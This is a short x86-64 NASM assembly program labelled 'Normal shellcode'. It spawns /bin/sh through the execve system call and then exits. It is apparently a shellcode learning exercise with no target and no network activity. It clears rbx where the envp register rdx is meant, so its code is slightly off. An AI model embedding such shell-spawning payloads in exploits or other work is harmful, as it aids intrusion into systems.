; Author: Arvind
; Date: 12/12/16
; Program: Normal shellcode

BITS 64

%define SYS_EXECVE 59
%define SYS_EXIT 60

section .rodata
    cmd: db "/bin/sh", 0


section .text
    global _start

    _start:
        xor rsi, rsi
        push rsi
        push cmd
        
        mov rax, SYS_EXECVE
        mov rdi, cmd
        mov rsi, rsp
        xor rbx, rbx
        syscall

        mov rax, SYS_EXIT
        xor rdi, rdi
        syscall
